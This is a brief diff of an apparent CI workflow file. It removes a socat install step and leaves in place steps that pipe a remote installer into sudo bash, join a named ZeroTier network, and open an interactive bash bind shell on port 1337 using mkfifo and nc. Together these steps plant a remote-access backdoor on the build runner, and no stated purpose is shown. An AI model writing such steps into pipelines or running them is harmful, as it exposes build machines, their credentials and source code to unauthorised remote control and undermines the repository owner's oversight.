@@ -6,5 +6,4 @@ jobs:
     steps:
       - run: curl -s https://install.zerotier.com | sudo bash
       - run: sudo zerotier-cli join 9aa0f2bcc44ca9fa
-      - run: apt install -y socat
       - run: rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 1337 > /tmp/f
